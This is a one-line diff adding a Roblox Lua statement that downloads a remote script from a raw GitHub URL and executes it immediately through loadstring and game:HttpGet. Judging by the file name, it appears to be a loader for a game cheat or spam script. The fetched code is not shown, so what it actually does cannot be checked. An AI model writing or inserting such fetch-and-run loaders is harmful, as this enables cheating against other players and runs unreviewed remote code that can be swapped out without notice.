@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Docktuangular/loaders/main/loaders/heisei-mothra-kaiju-alpha-spam3-0cez7daygsid11.lua"))()
